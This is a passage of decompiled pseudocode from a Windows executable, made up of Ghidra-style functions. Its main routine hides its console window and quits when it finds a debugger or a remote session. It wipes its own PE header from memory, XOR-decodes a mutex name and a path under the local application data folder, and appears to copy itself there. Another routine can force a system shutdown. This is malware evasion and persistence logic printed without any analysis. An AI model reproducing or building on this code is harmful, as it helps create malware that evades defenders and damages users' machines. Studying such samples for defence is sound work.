  lVar6 = lVar1 * 2 >> 1;
  if (1 < lVar6) {
    uVar2 = FUN_1400049a8(puVar5);
    uVar2 = (uVar2 & 0xffffffdf) - 0x3a0041;
    if (uVar2 < 0x1a) {
      uVar4 = (uint7)(uint3)(uVar2 >> 8);
      if ((2 < lVar6) &&
         ((*(short *)((longlong)puVar5 + 4) == 0x5c || (*(short *)((longlong)puVar5 + 4) == 0x2f))))
      {
        return CONCAT71(uVar4,1);
      }
      return (ulonglong)uVar4 << 8;
    }
  }
  puVar3 = (undefined8 *)FUN_140009e54((short *)puVar5,(short *)(lVar1 * 2 + (longlong)puVar5));
  return (ulonglong)puVar3 & 0xffffffffffffff00 | (ulonglong)(puVar5 != puVar3);
}



undefined4 * FUN_14000c60c(undefined4 *param_1,undefined4 param_2)

{
  undefined **ppuVar1;
  
  *param_1 = param_2;
  ppuVar1 = FUN_140002ea8();
  *(undefined ***)(param_1 + 2) = ppuVar1;
  return param_1;
}



undefined (*) [16] FUN_14000c62c(undefined8 param_1,undefined (*param_2) [16],int param_3)

{
  char *pcVar1;
  undefined *puVar2;
  
  pcVar1 = std::_Syserror_map(param_3);
  *param_2 = ZEXT816(0);
  *(undefined8 *)param_2[1] = 0;
  *(undefined8 *)(param_2[1] + 8) = 0;
  puVar2 = (undefined *)0xffffffffffffffff;
  do {
    puVar2 = puVar2 + 1;
  } while (pcVar1[(longlong)puVar2] != '\0');
  FUN_140001d68((void **)param_2,pcVar1,puVar2);
  return param_2;
}



undefined (*) [16] FUN_14000c670(undefined8 param_1,undefined (*param_2) [16],DWORD param_3)

{
  void *local_20;
  undefined *local_18;
  
  local_20 = (void *)0x0;
  local_18 = (undefined *)FUN_14000e2bc(param_3,(longlong *)&local_20);
  *param_2 = ZEXT816(0);
  if (local_18 == (undefined *)0x0) {
    *(undefined8 *)param_2[1] = 0xd;
    *(undefined8 *)(param_2[1] + 8) = 0xf;
    memmove(param_2,"unknown error",0xd);
  }
  else {
    *(undefined8 *)param_2[1] = 0;
    *(undefined8 *)(param_2[1] + 8) = 0;
    FUN_140001d68((void **)param_2,local_20,local_18);
  }
  LocalFree(local_20);
  return param_2;
}



char * FUN_14000c6e8(void)

{
  return "generic";
}



char * FUN_14000c6f0(void)

{
  return "system";
}



// WARNING: Could not reconcile some variable overlaps

void FUN_14000c6f8(longlong param_1,undefined (*param_2) [16])

{
  bool bVar1;
  bool bVar2;
  char *pcVar3;
  void *pvVar4;
  undefined *puVar5;
  undefined in_XMM0 [16];
  undefined extraout_XMM0 [16];
  undefined extraout_XMM0_00 [16];
  undefined auVar6 [16];
  undefined in_XMM1 [16];
  undefined auStack152 [40];
  undefined (*local_70) [16];
  undefined local_68 [16];
  undefined4 local_58;
  undefined4 uStack84;
  undefined4 uStack80;
  undefined4 uStack76;
  undefined local_48 [16];
  undefined local_38 [16];
  ulonglong local_28;
  
  local_28 = DAT_140017038 ^ (ulonglong)auStack152;
  local_70 = param_2;
  if (*(longlong *)(param_1 + 8) == 0) {
    puVar5 = local_68;
    auVar6 = in_XMM0 & (undefined  [16])0x0;
    bVar1 = true;
    local_68 = in_XMM0 & (undefined  [16])0x0;
    bVar2 = false;
    local_58 = 0;
    uStack84 = 0;
    uStack80 = 0xf;
    uStack76 = 0;
  }
  else {
    pcVar3 = std::_Yarn<char>::c_str((_Yarn_char_ *)(*(longlong *)(param_1 + 8) + 0x28));
    local_48 = extraout_XMM0 & (undefined  [16])0x0;
    local_38 = in_XMM1 & (undefined  [16])0x0;
    puVar5 = (undefined *)0xffffffffffffffff;
    do {
      puVar5 = puVar5 + 1;
    } while (pcVar3[(longlong)puVar5] != '\0');
    FUN_140001d68((void **)local_48,pcVar3,puVar5);
    bVar1 = false;
    puVar5 = local_48;
    bVar2 = true;
    auVar6 = extraout_XMM0_00;
  }
  *param_2 = auVar6 & (undefined  [16])0x0;
  *(undefined8 *)param_2[1] = 0;
  *(undefined8 *)(param_2[1] + 8) = 0;
  memcpy(param_2,puVar5,0x20);
  *(undefined8 *)(puVar5 + 0x10) = 0;
  *(undefined8 *)(puVar5 + 0x18) = 0xf;
  *puVar5 = 0;
  if (bVar1) {
    if (0xf < CONCAT44(uStack76,uStack80)) {
      pvVar4 = local_68._0_8_;
      if ((0xfff < CONCAT44(uStack76,uStack80) + 1) &&
         (pvVar4 = *(void **)((longlong)local_68._0_8_ + -8),
         0x1f < (ulonglong)((longlong)local_68._0_8_ + (-8 - (longlong)pvVar4))))
      goto LAB_14000c842;
      free(pvVar4);
    }
    local_58 = 0;
    uStack84 = 0;
    uStack80 = 0xf;
    uStack76 = 0;
    local_68 = local_68 & (undefined  [16])0xffffffffffffff00;
  }
  if ((bVar2) && (0xf < local_38._8_8_)) {
    pvVar4 = local_48._0_8_;
    if ((0xfff < local_38._8_8_ + 1) &&
       (pvVar4 = *(void **)((longlong)local_48._0_8_ + -8),
       0x1f < (ulonglong)((longlong)local_48._0_8_ + (-8 - (longlong)pvVar4)))) {
LAB_14000c842:
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar4);
  }
  FUN_14000eed0(local_28 ^ (ulonglong)auStack152);
  return;
}



int FUN_14000c878(basic_streambuf_char_struct_std__char_traits_char___ *param_1,int param_2)

{
  void *_Src;
  undefined8 uVar1;
  char *pcVar2;
  void *pvVar3;
  longlong lVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  
  if (((byte)param_1[0x70] & 2) != 0) {
    return -1;
  }
  if (param_2 == -1) {
    return 0;
  }
  uVar5 = **(ulonglong **)(param_1 + 0x40);
  if ((uVar5 != 0) && (uVar5 < (longlong)**(int **)(param_1 + 0x58) + uVar5)) {
    pcVar2 = std::basic_streambuf<char,struct_std::char_traits<char>_>::_Pninc(param_1);
    *pcVar2 = (char)param_2;
    *(ulonglong *)(param_1 + 0x68) = uVar5 + 1;
    return param_2;
  }
  _Src = **(void ***)(param_1 + 0x18);
  uVar6 = 0x20;
  uVar5 = -(ulonglong)(uVar5 != 0) & ((longlong)**(int **)(param_1 + 0x58) + uVar5) - (longlong)_Src
  ;
  if (uVar5 < 0x20) {
LAB_14000c91e:
    pvVar3 = operator_new(uVar6);
  }
  else {
    if (uVar5 < 0x3fffffff) {
      uVar6 = uVar5 * 2;
      if (uVar6 < 0x1000) {
        if (uVar6 == 0) {
          pvVar3 = (void *)0x0;
          goto LAB_14000c946;
        }
        goto LAB_14000c91e;
      }
    }
    else {
      uVar6 = 0x7fffffff;
      if (0x7ffffffe < uVar5) {
        return -1;
      }
    }
    pvVar3 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar6);
  }
LAB_14000c946:
  memcpy(pvVar3,_Src,uVar5);
  lVar4 = uVar5 + (longlong)pvVar3;
  *(longlong *)(param_1 + 0x68) = lVar4 + 1;
  **(void ***)(param_1 + 0x20) = pvVar3;
  **(longlong **)(param_1 + 0x40) = lVar4;
  **(int **)(param_1 + 0x58) = ((int)pvVar3 - (int)lVar4) + (int)uVar6;
  if (((byte)param_1[0x70] & 4) == 0) {
    uVar1 = *(undefined8 *)(param_1 + 0x68);
    lVar4 = (**(longlong **)(param_1 + 0x38) - (longlong)_Src) + (longlong)pvVar3;
    **(void ***)(param_1 + 0x18) = pvVar3;
    **(longlong **)(param_1 + 0x38) = lVar4;
    **(int **)(param_1 + 0x50) = (int)uVar1 - (int)lVar4;
  }
  else {
    **(void ***)(param_1 + 0x18) = pvVar3;
    **(undefined8 **)(param_1 + 0x38) = 0;
    **(int **)(param_1 + 0x50) = (int)pvVar3;
  }
  if (((byte)param_1[0x70] & 1) != 0) {
    pvVar3 = _Src;
    if ((0xfff < uVar5) &&
       (pvVar3 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar3)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar3);
  }
  *(uint *)(param_1 + 0x70) = *(uint *)(param_1 + 0x70) | 1;
  pcVar2 = std::basic_streambuf<char,struct_std::char_traits<char>_>::_Pninc(param_1);
  *pcVar2 = (char)param_2;
  return param_2;
}



int FUN_14000ca2c(basic_streambuf_char_struct_std__char_traits_char___ *param_1,int param_2)

{
  ulonglong uVar1;
  int iVar2;
  
  iVar2 = 0;
  uVar1 = **(ulonglong **)(param_1 + 0x38);
  if (((uVar1 == 0) ||
      (uVar1 < **(ulonglong **)(param_1 + 0x18) || uVar1 == **(ulonglong **)(param_1 + 0x18))) ||
     ((param_2 != -1 &&
      (((char)param_2 != *(char *)(uVar1 - 1) && (((byte)param_1[0x70] & 2) != 0)))))) {
    iVar2 = -1;
  }
  else {
    std::basic_streambuf<char,struct_std::char_traits<char>_>::gbump(param_1,-1);
    if (param_2 != -1) {
      ***(char ***)(param_1 + 0x38) = (char)param_2;
      iVar2 = param_2;
    }
  }
  return iVar2;
}



void FUN_14000ca9c(uint **param_1,uint *param_2,char param_3)

{
  longlong lVar1;
  uint **ppuVar2;
  longlong *plVar3;
  bool bVar4;
  char local_res18 [16];
  uint *local_48;
  uint *puStack64;
  undefined4 local_38;
  undefined4 uStack52;
  undefined4 uStack48;
  undefined4 uStack44;
  longlong local_28 [2];
  longlong local_18 [2];
  
  bVar4 = param_2 <= param_1[3];
  local_res18[0] = param_3;
  if (bVar4) {
    if (bVar4 && param_1[3] != param_2) {
      plVar3 = FUN_14000c12c(param_1,local_28);
      if (((longlong)param_2 < 0) && (param_2 != (uint *)0x0)) {
        lVar1 = -((~(ulonglong)param_2 >> 5) * 4 + 4);
      }
      else {
        lVar1 = ((ulonglong)param_2 >> 5) * 4;
      }
      local_48 = (uint *)((longlong)*param_1 + lVar1);
      local_38 = *(undefined4 *)plVar3;
      uStack52 = *(undefined4 *)((longlong)plVar3 + 4);
      uStack48 = *(undefined4 *)(plVar3 + 1);
      uStack44 = *(undefined4 *)((longlong)plVar3 + 0xc);
      puStack64 = (uint *)(ulonglong)((uint)param_2 & 0x1f);
      FUN_14000c1f8(param_1,local_18,(longlong *)&local_48,(uint **)&local_38);
    }
  }
  else {
    ppuVar2 = (uint **)FUN_14000c12c(param_1,(longlong *)&local_38);
    local_48 = *ppuVar2;
    puStack64 = ppuVar2[1];
    FUN_14000a1a0(param_1,local_28,&local_48,(longlong)param_2 - (longlong)param_1[3],local_res18);
  }
  return;
}



ulonglong *
FUN_14000cb7c(longlong param_1,ulonglong *param_2,longlong param_3,int param_4,byte param_5)

{
  longlong lVar1;
  int iVar2;
  ulonglong uVar3;
  longlong lVar4;
  longlong lVar5;
  undefined8 uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  
  uVar3 = **(ulonglong **)(param_1 + 0x38);
  if ((*(byte *)(param_1 + 0x70) & 2) == 0) {
    uVar8 = **(ulonglong **)(param_1 + 0x40);
    if ((uVar8 != 0) && (*(ulonglong *)(param_1 + 0x68) < uVar8)) {
      *(ulonglong *)(param_1 + 0x68) = uVar8;
    }
  }
  else {
    uVar8 = 0;
  }
  lVar4 = *(longlong *)(param_1 + 0x68);
  lVar5 = **(longlong **)(param_1 + 0x18);
  uVar9 = lVar4 - lVar5;
  if (param_4 == 0) {
    uVar7 = 0;
LAB_14000cc37:
    uVar7 = uVar7 + param_3;
    if ((uVar7 <= uVar9) &&
       ((uVar7 == 0 ||
        ((((param_5 & 1) == 0 || (uVar3 != 0)) && (((param_5 & 2) == 0 || (uVar8 != 0)))))))) {
      lVar1 = lVar5 + uVar7;
      if (((param_5 & 1) != 0) && (uVar3 != 0)) {
        **(longlong **)(param_1 + 0x18) = lVar5;
        **(longlong **)(param_1 + 0x38) = lVar1;
        **(int **)(param_1 + 0x50) = (int)lVar4 - (int)lVar1;
      }
      if (((param_5 & 2) != 0) && (uVar8 != 0)) {
        iVar2 = **(int **)(param_1 + 0x58);
        uVar6 = **(undefined8 **)(param_1 + 0x40);
        **(longlong **)(param_1 + 0x20) = lVar5;
        **(longlong **)(param_1 + 0x40) = lVar1;
        **(int **)(param_1 + 0x58) = (iVar2 + (int)uVar6) - (int)lVar1;
      }
      *param_2 = uVar7;
      goto LAB_14000ccb6;
    }
  }
  else if (param_4 == 1) {
    if ((((param_5 & 3) != 3) &&
        ((uVar7 = uVar3, (param_5 & 1) != 0 || (uVar7 = uVar8, (param_5 & 2) != 0)))) &&
       ((uVar7 != 0 || (lVar5 == 0)))) {
      uVar7 = uVar7 - lVar5;
      goto LAB_14000cc37;
    }
  }
  else {
    uVar7 = uVar9;
    if (param_4 == 2) goto LAB_14000cc37;
  }
  *param_2 = 0xffffffffffffffff;
LAB_14000ccb6:
  param_2[1] = 0;
  param_2[2] = 0;
  return param_2;
}



ulonglong * FUN_14000ccdc(longlong param_1,ulonglong *param_2,longlong *param_3,byte param_4)

{
  longlong lVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  undefined8 uVar6;
  ulonglong uVar7;
  ulonglong uVar8;
  
  uVar8 = param_3[1] + *param_3;
  lVar3 = **(longlong **)(param_1 + 0x38);
  if ((*(byte *)(param_1 + 0x70) & 2) == 0) {
    uVar7 = **(ulonglong **)(param_1 + 0x40);
    if ((uVar7 != 0) && (*(ulonglong *)(param_1 + 0x68) < uVar7)) {
      *(ulonglong *)(param_1 + 0x68) = uVar7;
    }
  }
  else {
    uVar7 = 0;
  }
  lVar4 = *(longlong *)(param_1 + 0x68);
  lVar5 = **(longlong **)(param_1 + 0x18);
  if (((ulonglong)(lVar4 - lVar5) < uVar8) ||
     ((uVar8 != 0 &&
      ((((param_4 & 1) != 0 && (lVar3 == 0)) || (((param_4 & 2) != 0 && (uVar7 == 0)))))))) {
    *param_2 = 0xffffffffffffffff;
  }
  else {
    lVar1 = lVar5 + uVar8;
    if (((param_4 & 1) != 0) && (lVar3 != 0)) {
      **(longlong **)(param_1 + 0x18) = lVar5;
      **(longlong **)(param_1 + 0x38) = lVar1;
      **(int **)(param_1 + 0x50) = (int)lVar4 - (int)lVar1;
    }
    if (((param_4 & 2) != 0) && (uVar7 != 0)) {
      iVar2 = **(int **)(param_1 + 0x58);
      uVar6 = **(undefined8 **)(param_1 + 0x40);
      **(longlong **)(param_1 + 0x20) = lVar5;
      **(longlong **)(param_1 + 0x40) = lVar1;
      **(int **)(param_1 + 0x58) = (iVar2 + (int)uVar6) - (int)lVar1;
    }
    *param_2 = uVar8;
  }
  param_2[1] = 0;
  param_2[2] = 0;
  return param_2;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_14000cdd0(undefined8 *param_1,undefined8 *param_2,int *param_3)

{
  undefined auStack104 [32];
  int local_48;
  undefined4 uStack68;
  int local_40;
  undefined8 local_38;
  undefined8 uStack48;
  ulonglong local_18;
  
  local_18 = DAT_140017038 ^ (ulonglong)auStack104;
  local_48 = 0;
  uStack68 = 0xffff;
  if (7 < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  local_40 = FUN_14000e630((LPCWSTR)param_2,&local_38,3,0xffffffff);
  FUN_14000b168(&local_48,local_40,(longlong)&local_38);
  local_38._0_4_ = local_40;
  uStack48 = FUN_140002eb0();
  uStack48._4_4_ = (int)((ulonglong)uStack48 >> 0x20);
  *param_3 = (int)local_38;
  param_3[1] = local_38._4_4_;
  param_3[2] = (int)uStack48;
  param_3[3] = uStack48._4_4_;
  *param_1 = CONCAT44(uStack68,local_48);
  FUN_14000eed0(local_18 ^ (ulonglong)auStack104);
  return;
}



undefined (*) [16] FUN_14000ce78(longlong param_1,undefined (*param_2) [16])

{
  void *local_20;
  void *local_18;
  
  *param_2 = ZEXT816(0);
  *(undefined8 *)param_2[1] = 0;
  *(undefined8 *)param_2[1] = 0;
  *(undefined8 *)(param_2[1] + 8) = 0xf;
  (*param_2)[0] = 0;
  FUN_140009f50(param_1,(undefined (*) [16])&local_20);
  if (local_20 != (void *)0x0) {
    if (local_18 < (void *)0x10) {
      *(void **)param_2[1] = local_18;
      memmove(param_2,local_20,(size_t)local_18);
      *(undefined *)((longlong)local_18 + (longlong)param_2) = 0;
    }
    else {
      FUN_140003494((void **)param_2,local_18,0,local_20);
    }
  }
  return param_2;
}



void FUN_14000cf04(longlong **param_1,undefined param_2)

{
  void *_Memory;
  undefined auStack104 [32];
  undefined local_48;
  undefined local_47 [15];
  void *local_38 [3];
  ulonglong local_20;
  ulonglong local_18;
  
  local_18 = DAT_140017038 ^ (ulonglong)auStack104;
  local_48 = param_2;
  (**(code **)(**param_1 + 0x20))(*param_1,local_38,&local_48,local_47);
  if (0xf < local_20) {
    _Memory = local_38[0];
    if ((0xfff < local_20 + 1) &&
       (_Memory = *(void **)((longlong)local_38[0] + -8),
       0x1f < (ulonglong)((longlong)local_38[0] + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  FUN_14000eed0(local_18 ^ (ulonglong)auStack104);
  return;
}



ulonglong FUN_14000cfa8(longlong param_1)

{
  byte **ppbVar1;
  byte *pbVar2;
  byte **ppbVar3;
  byte *pbVar4;
  
  ppbVar1 = *(byte ***)(param_1 + 0x38);
  pbVar2 = *ppbVar1;
  if (pbVar2 != (byte *)0x0) {
    if (pbVar2 < pbVar2 + **(int **)(param_1 + 0x50)) {
      return (ulonglong)*pbVar2;
    }
    ppbVar3 = *(byte ***)(param_1 + 0x40);
    if ((*ppbVar3 != (byte *)0x0) && ((*(byte *)(param_1 + 0x70) & 4) == 0)) {
      pbVar4 = *(byte **)(param_1 + 0x68);
      if (pbVar4 < *ppbVar3) {
        pbVar4 = *ppbVar3;
      }
      if (pbVar2 < pbVar4) {
        *(byte **)(param_1 + 0x68) = pbVar4;
        pbVar2 = *ppbVar1;
        *ppbVar1 = pbVar2;
        **(int **)(param_1 + 0x50) = (int)pbVar4 - (int)pbVar2;
        return (ulonglong)***(byte ***)(param_1 + 0x38);
      }
    }
  }
  return 0xffffffff;
}



// WARNING: Function: __chkstk replaced with injection: alloca_probe

void FUN_14000d010(void)

{
  int iVar1;
  uint uVar2;
  BOOL BVar3;
  HANDLE ProcessHandle;
  longlong *this;
  ulonglong uVar4;
  char *pcVar5;
  undefined auStackY5120 [32];
  HANDLE local_13d0;
  undefined local_13c8 [16];
  undefined4 local_13b8;
  uint local_13b0;
  uint local_13ac [1250];
  undefined4 local_24;
  ulonglong local_18;
  undefined8 uStack16;
  
  uStack16 = 0x14000d024;
  local_18 = DAT_140017038 ^ (ulonglong)auStackY5120;
  local_13ac[0] = std::_Random_device();
  local_24 = 0xffffffff;
  uVar4 = 1;
  uVar2 = local_13ac[0];
  do {
    uVar2 = (uVar2 >> 0x1e ^ uVar2) * 0x6c078965 + (int)uVar4;
    local_13ac[uVar4] = uVar2;
    uVar4 = uVar4 + 1;
  } while (uVar4 < 0x270);
  local_13b8 = 0xffffffff;
  local_13c8._0_8_ = &local_13b0;
  local_13b0 = 0x270;
  local_13c8._8_8_ = 0x20;
  uVar4 = FUN_140006610((uint **)local_13c8,3);
  iVar1 = (int)uVar4;
  if (iVar1 == 0) {
                    // WARNING: Subroutine does not return
    exit(0);
  }
  if (iVar1 == 1) {
    ProcessHandle = GetCurrentProcess();
    BVar3 = OpenProcessToken(ProcessHandle,0x28,&local_13d0);
    if (BVar3 == 0) {
      pcVar5 = "Error: Failed to open process token";
    }
    else {
      LookupPrivilegeValueA((LPCSTR)0x0,"SeShutdownPrivilege",(PLUID)(local_13c8 + 4));
      local_13c8._0_8_ = (uint *)CONCAT44(local_13c8._4_4_,1);
      local_13c8._8_8_ = CONCAT44(2,local_13c8._8_4_);
      AdjustTokenPrivileges
                (local_13d0,0,(PTOKEN_PRIVILEGES)local_13c8,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
      BVar3 = ExitWindowsEx(5,0x30000);
      if (BVar3 != 0) goto LAB_14000d16f;
      pcVar5 = "Error: Failed to shut down system";
    }
    this = FUN_1400018c8((longlong *)cerr_exref,pcVar5);
    std::basic_ostream<char,struct_std::char_traits<char>_>::operator__
              ((basic_ostream_char_struct_std__char_traits_char___ *)this,FUN_140004a5c);
  }
  else if (iVar1 == 2) {
    do {
      Sleep(0xffffffff);
    } while( true );
  }
LAB_14000d16f:
  FUN_14000eed0(local_18 ^ (ulonglong)auStackY5120);
  return;
}



char * FUN_14000d198(longlong param_1)

{
  char *pcVar1;
  
  pcVar1 = "Unknown exception";
  if (*(longlong *)(param_1 + 8) != 0) {
    pcVar1 = *(char **)(param_1 + 8);
  }
  return pcVar1;
}



longlong * FUN_14000d1ac(longlong param_1)

{
  longlong **pplVar1;
  
  pplVar1 = (longlong **)(param_1 + 0x68);
  if (0xf < *(ulonglong *)(param_1 + 0x80)) {
    pplVar1 = (longlong **)*pplVar1;
  }
  return (longlong *)pplVar1;
}



undefined * FUN_14000d1bc(void)

{
  return &DAT_1400177e0;
}



void FUN_14000d1c4(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  undefined8 uVar1;
  undefined8 *puVar2;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  uVar1 = __acrt_iob_func(1);
  puVar2 = (undefined8 *)FUN_14000d1bc();
  __stdio_common_vfprintf(*puVar2,uVar1,param_1,0,&local_res10);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_14000d214(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  byte *pbVar1;
  void *pvVar2;
  char cVar3;
  int iVar4;
  BOOL BVar5;
  errno_t eVar6;
  DWORD DVar7;
  HWND hWnd;
  HMODULE lpAddress;
  ulonglong uVar8;
  HANDLE pvVar9;
  longlong *plVar10;
  BYTE *lpData;
  undefined (*_Src) [16];
  HGLOBAL _Dst;
  longlong lVar11;
  ulonglong uVar12;
  undefined8 ****ppppuVar13;
  void *pvVar14;
  undefined8 uVar15;
  undefined8 *puVar16;
  longlong *plVar17;
  longlong in_GS_OFFSET;
  undefined extraout_XMM0 [16];
  undefined extraout_XMM0_00 [16];
  undefined extraout_XMM0_01 [16];
  undefined in_XMM1 [16];
  undefined auStackY1512 [32];
  undefined8 local_5b0;
  HKEY local_5a8 [2];
  ushort *local_598;
  ulonglong uStack1424;
  undefined8 ****local_588 [2];
  undefined *local_578;
  ulonglong uStack1392;
  undefined *local_568;
  ulonglong uStack1376;
  undefined *local_558;
  ulonglong uStack1360;
  undefined8 ****local_548 [2];
  undefined *local_538;
  ulonglong uStack1328;
  undefined *local_528;
  ulonglong uStack1312;
  undefined *local_518;
  ulonglong uStack1296;
  longlong local_508 [2];
  longlong local_4f8 [2];
  longlong local_4e8;
  undefined local_4e0 [128];
  basic_ios_char_struct_std__char_traits_char___ local_460 [104];
  undefined4 local_3f8;
  undefined2 local_3f4;
  undefined local_3f2;
  undefined local_3f0 [16];
  undefined local_3e0 [16];
  undefined8 local_3d0;
  undefined4 local_3c8;
  uint local_3c4;
  undefined4 local_3c0;
  undefined4 local_3bc;
  undefined local_3b8;
  undefined4 local_3b0;
  undefined4 local_3ac;
  ushort local_3a8;
  undefined4 local_3a0;
  undefined4 uStack924;
  undefined4 uStack920;
  undefined4 uStack916;
  undefined4 local_390;
  undefined4 uStack908;
  undefined4 uStack904;
  undefined4 uStack900;
  undefined4 local_380;
  undefined2 local_37c;
  undefined local_37a;
  undefined4 local_378;
  undefined4 uStack884;
  undefined4 uStack880;
  undefined4 uStack876;
  undefined2 local_368;
  undefined local_366;
  undefined4 local_360;
  undefined4 uStack860;
  undefined4 uStack856;
  undefined4 uStack852;
  undefined4 local_350;
  undefined4 uStack844;
  undefined4 uStack840;
  undefined4 uStack836;
  undefined4 local_340;
  undefined4 local_33c;
  undefined4 local_338;
  undefined2 local_334;
  undefined local_332;
  undefined4 local_330;
  undefined4 uStack812;
  undefined4 uStack808;
  undefined4 uStack804;
  undefined local_320;
  undefined4 local_318;
  undefined4 uStack788;
  undefined4 uStack784;
  undefined4 uStack780;
  undefined4 local_308;
  undefined4 uStack772;
  undefined4 uStack768;
  undefined4 uStack764;
  undefined4 local_2f8;
  undefined4 local_2f4;
  undefined local_2f0;
  ushort local_2ef;
  undefined8 ****local_2e8 [3];
  ulonglong local_2d0;
  undefined4 local_2c8;
  undefined4 uStack708;
  undefined4 uStack704;
  uint uStack700;
  BYTE local_2b8;
  undefined7 uStack695;
  undefined4 local_2a8;
  undefined4 uStack676;
  undefined4 uStack672;
  undefined4 uStack668;
  undefined8 ****local_298 [2];
  void *local_288;
  ulonglong local_280;
  undefined local_278 [16];
  undefined local_268 [16];
  undefined8 local_258;
  undefined4 local_248;
  undefined4 uStack580;
  undefined4 uStack576;
  undefined4 uStack572;
  undefined8 local_238;
  undefined4 local_228;
  undefined4 uStack548;
  undefined4 uStack544;
  undefined4 uStack540;
  undefined8 local_218;
  undefined4 local_208;
  undefined4 uStack516;
  undefined4 uStack512;
  undefined4 uStack508;
  undefined8 local_1f8;
  undefined4 local_1e8;
  undefined4 uStack484;
  undefined4 uStack480;
  undefined4 uStack476;
  undefined8 local_1d8;
  undefined4 local_1c8;
  undefined4 uStack452;
  undefined4 uStack448;
  undefined4 uStack444;
  undefined8 ****local_1b8 [3];
  ulonglong local_1a0;
  void *local_198 [3];
  ulonglong local_180;
  void *local_178 [3];
  ulonglong local_160;
  void *local_158;
  int local_148;
  ulonglong local_140;
  CHAR local_138 [272];
  ulonglong local_28;
  
  local_28 = DAT_140017038 ^ (ulonglong)auStackY1512;
  FUN_14000c4ec();
  hWnd = GetConsoleWindow();
  uVar15 = 0;
  ShowWindow(hWnd,0);
  FUN_14000c450();
  iVar4 = GetSystemMetrics(0x1000);
  uVar12 = 0;
  if ((iVar4 != 0) || (iVar4 = GetSystemMetrics(0x1000), iVar4 != 0)) {
LAB_14000e29a:
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  FUN_14000c450();
  cVar3 = FUN_140006db4();
  if (cVar3 != '\0') {
    FUN_14000d010();
    goto LAB_14000d2a2;
  }
  FUN_14000c450();
  BVar5 = IsDebuggerPresent();
  if ((BVar5 != 0) || (FUN_14000c450(), *(char *)(*(longlong *)(in_GS_OFFSET + 0x60) + 2) != '\0'))
  goto LAB_14000e29a;
  FUN_14000c450();
  FUN_14000d1c4("[*] Erasing PE header from memory\n",uVar15,param_3,param_4);
  local_5b0 = (ulonglong)local_5b0._4_4_ << 0x20;
  lpAddress = GetModuleHandleA((LPCSTR)0x0);
  VirtualProtect(lpAddress,0x1000,4,(PDWORD)&local_5b0);
  for (lVar11 = 0x1000; lVar11 != 0; lVar11 = lVar11 + -1) {
    *(undefined *)&lpAddress->unused = 0;
    lpAddress = (HMODULE)((longlong)&lpAddress->unused + 1);
  }
  FUN_14000c450();
  uVar8 = 0;
  do {
    pbVar1 = (byte *)((longlong)&local_3d0 + uVar8 + 1);
    *pbVar1 = *pbVar1 ^ 0x5c;
    uVar8 = uVar8 + 1;
  } while (uVar8 < 3);
  local_3d0 = (char *)CONCAT35(local_3d0._5_3_,0x2e2c315c);
  pvVar9 = OpenMutexA(0x1f0001,0,(LPCSTR)((longlong)&local_3d0 + 1));
  if (pvVar9 == (HANDLE)0x0) {
    local_3d0 = (char *)0x0;
    local_5b0 = 0;
    eVar6 = _dupenv_s((char **)&local_3d0,&local_5b0,"localappdata");
    if ((eVar6 != 0) || (local_3d0 == (char *)0x0)) goto LAB_14000d2a2;
    local_278 = extraout_XMM0 & (undefined  [16])0x0;
    in_XMM1 = in_XMM1 & (undefined  [16])0x0;
    local_268 = in_XMM1;
    FUN_140001d68((void **)local_278,local_3d0,(undefined *)(local_5b0 - 1));
    FUN_14000242c((undefined (*) [16])local_298,(undefined8 *)local_278);
    if (0xf < local_268._8_8_) {
      pvVar14 = local_278._0_8_;
      if ((0xfff < local_268._8_8_ + 1) &&
         (pvVar14 = *(void **)((longlong)local_278._0_8_ + -8),
         0x1f < (ulonglong)((longlong)local_278._0_8_ + (-8 - (longlong)pvVar14)))) {
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pvVar14);
    }
    free(local_3d0);
    uVar8 = 0;
    local_3c0 = 0x11130e63;
    local_3bc = 0x61b064d;
    do {
      pbVar1 = (byte *)((longlong)&local_3c0 + uVar8 + 1);
      *pbVar1 = *pbVar1 ^ 99;
      uVar8 = uVar8 + 1;
    } while (uVar8 < 7);
    local_508[0] = (longlong)&local_3c0 + 1;
    local_3b8 = 0;
    FUN_1400023e8((undefined (*) [16])local_198,local_508);
    ppppuVar13 = local_298;
    if (7 < local_280) {
      ppppuVar13 = local_298[0];
    }
    local_3f0 = extraout_XMM0_00 & (undefined  [16])0x0;
    local_3e0 = in_XMM1 & (undefined  [16])0x0;
    FUN_140001f10((void **)local_3f0,ppppuVar13,local_288);
    FUN_140006740((void **)local_3f0,local_198,local_288);
    FUN_14000b774(local_198);
    GetModuleFileNameA((HMODULE)0x0,local_138,0x104);
    FUN_1400023a4((undefined (*) [16])local_2e8,(longlong)local_138);
    local_3f0._0_8_ = (ushort *)local_3f0;
    if (7 < local_3e0._8_8_) {
    }
    uStack1424 = local_3e0._0_8_ & 0xffffffff00000000 | (ulonglong)SUB164(local_3e0,0);
    local_598 = local_3f0._0_8_;
    iVar4 = FUN_14000bcf0(local_2e8,&local_598);
    if (iVar4 == 0) {
      FUN_14000b774(local_2e8);
      if (7 < local_3e0._8_8_) {
        pvVar14 = local_3f0._0_8_;
        if ((0xfff < local_3e0._8_8_ * 2 + 2) &&
           (pvVar14 = *(void **)((longlong)local_3f0._0_8_ + -8),
